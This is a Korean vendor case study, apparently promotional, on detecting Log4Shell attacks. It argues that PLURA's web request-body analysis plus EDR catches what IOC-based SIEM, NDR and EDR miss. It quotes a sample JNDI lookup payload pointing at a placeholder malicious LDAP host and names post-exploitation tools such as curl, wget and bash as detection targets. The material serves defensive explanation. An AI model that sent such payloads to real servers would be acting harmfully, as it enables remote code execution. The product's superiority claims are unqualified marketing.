## **사례 1: Log4j(Log4Shell) 취약점 공격 탐지**

### **1️⃣ 기존 위협 헌팅(SIEM + EDR + NDR + TI)이 탐지하지 못하는 이유**
| **비교 항목** | **기존 위협 헌팅 (SIEM + EDR + NDR + TI)** | **PLURA 웹 요청 본문 분석 + EDR** |
|----------|-------------------------------|-------------------------------|
| **탐지 방식** | IOC(위협 인텔리전스) 기반 탐지 → 기존 패턴 매칭에 의존하여 새로운 공격 탐지 어려움 | 행위 기반 탐지 → 웹 요청 본문과 실행 행위까지 실시간 분석하여 신규 공격 탐지 가능 |
| **웹 애플리케이션 공격 탐지** | 웹 요청 헤더, URL 분석만 가능 → 요청 본문 내부의 악성 패턴 분석 불가능 | **웹 요청 본문을 실시간 분석하여 JNDI 호출 패턴 탐지 가능** |
| **네트워크 트래픽 분석** | NDR이 SSL 복호화 후 패킷 분석 가능하지만 요청 본문 분석 불가 | **요청 본문을 분석하여 JNDI 패턴 포함 여부를 확인하고 탐지 가능** |
| **엔드포인트 보안** | EDR이 실행된 프로세스를 감지 가능하지만, 웹 애플리케이션에서 발생한 공격과의 연계 분석 어려움 | **EDR이 원격 코드 실행(RCE) 발생 시, 악성 프로세스 실행(Fork, Execve) 탐지 가능** |

### **2️⃣ 기존 위협 헌팅이 탐지하지 못하는 이유 상세 설명**
1. **SIEM + TI(Threat Intelligence) 한계**  
   - 기존 SIEM 및 TI는 **정적 IOC(Indicator of Compromise) 기반 탐지**에 의존합니다.  
   - 즉, **이미 알려진 악성 IP, 도메인, 파일 해시 값 등을 기반으로 탐지**하기 때문에, Log4j처럼 **새롭게 등장한 취약점을 이용한 공격을 탐지하기 어려움**.  
   - 공격자들이 **새로운 JNDI 호출 변형(payload 변형)을 이용하면 IOC 매칭을 우회**할 수 있음.  

2. **NDR(네트워크 기반 탐지)의 한계**  
   - NDR은 **SSL 복호화를 통해 네트워크 트래픽을 분석할 수 있지만, 요청 본문(payload)까지 정밀하게 분석하지 못함**.  
   - 즉, `jndi:ldap://malicious.com/exploit` 같은 **악성 페이로드가 포함된 웹 요청의 본문을 분석할 수 없음**.  
   - 네트워크 단에서 악성 트래픽이 발생할 수 있지만, **로그의 맥락(context)을 고려한 분석이 어려움**.  

3. **EDR(엔드포인트 보안)의 한계**  
   - EDR은 웹 서버 내에서 발생하는 악성 프로세스 실행(`curl`, `wget`, `bash` 등)을 감지할 수 있음.  
   - 하지만, **웹 애플리케이션에서 공격이 시작된 원인을 직접 분석하지 못하기 때문에, 웹 요청과 실행 프로세스 간의 연관성을 파악하기 어려움**.  
   - 즉, **웹 요청 → 악성 코드 실행**까지의 공격 흐름을 제대로 분석하지 못하면, 단순한 이상 프로세스로 오탐할 가능성이 있음.  

---

### **3️⃣ PLURA 웹 요청 본문 분석 + EDR을 통한 탐지 방법**
✅ **1) 웹 요청 본문 분석을 통해 악성 패턴 탐지**  
   - PLURA는 **웹 요청 본문을 실시간 분석**하여 `jndi:ldap://malicious.com/exploit`와 같은 패턴을 탐지 가능.  
   - 검색창, 유저 입력값, HTTP 헤더, API 요청 본문에서 **비정상적인 LDAP, RMI 호출 탐지 가능**.  
   - 기존 WAF가 탐지하지 못하는 **다양한 JNDI 호출 변형을 분석하여 우회 공격도 탐지 가능**.  

✅ **2) 실행 행위 기반 탐지 및 차단 (EDR 연계)**  
   - 공격이 성공하여 원격 코드 실행(RCE)이 발생할 경우,  
   - PLURA EDR이 **커널 레벨에서 새로운 프로세스 생성 이벤트(Fork, Execve) 탐지**.  
   - 예를 들어, 공격 성공 후 `curl`, `wget`, `bash` 등의 프로세스가 실행되면 이를 감지하여 즉시 차단 가능.  

✅ **3) 공격 흐름을 상관 분석하여 추가 공격 차단**  
   - 기존 IOC 기반 탐지가 어려운 공격이라도, **LDAP/RMI 요청 이후 특정 프로세스가 실행되는 패턴을 탐지하여 추가 공격을 사전 차단 가능**.  
   - 즉, 공격자가 **JNDI 호출 변형을 사용하여 시그니처 기반 탐지를 우회**하려 해도 **행위 분석을 통해 탐지 가능**.  

---

### **📌 결론: PLURA 웹 요청 본문 분석 + EDR이 Log4j 공격 탐지에서 뛰어난 이유**
✅ **기존 위협 헌팅(SIEM + EDR + NDR + TI)은 IOC 기반 탐지에 의존하여 Log4j처럼 새로운 공격 패턴을 탐지하는 데 한계가 있음**.  
✅ **PLURA-XDR은 웹 요청 본문을 분석하고 행위 기반 탐지를 수행하여 Log4j 공격을 실시간으로 탐지 가능**.  
✅ **WAF를 우회하는 공격, 크리덴셜 스터핑, API Abuse, 랜섬웨어 탐지까지 대응 가능**.  
✅ **EDR 연계를 통해 커널 레벨에서 악성 프로세스 실행, 웹쉘 설치, 파일 변조(FIM) 등을 탐지하여 공격자의 추가 행위를 차단**.  

🔹 **PLURA-XDR은 기존 보안 체계가 탐지하지 못하는 Zero-Day 공격까지 대응할 수 있는 차세대 보안 플랫폼입니다.** 🚀  

---

### **📌 개선된 핵심 포인트**
1. 기존 위협 헌팅이 **IOC 기반 탐지에 의존하여 새로운 공격 패턴을 탐지하지 못하는 이유**를 구체적으로 설명.  
2. **PLURA가 요청 본문을 분석하여 JNDI 패턴을 탐지하고, 실행된 악성 프로세스를 감지하여 차단하는 방식**을 명확하게 설명.  
3. 기존 보안 시스템이 탐지하지 못하는 이유를 **SIEM, NDR, EDR 별로 구체적으로 정리**하여 차별점을 강조.  

이제 독자가 **왜 기존 위협 헌팅이 Log4j 공격을 탐지하지 못하고, PLURA 웹 요청 본문 분석 + EDR이 더 강력한 탐지 방법인지**를 쉽게 이해할 수 있을 것입니다.  
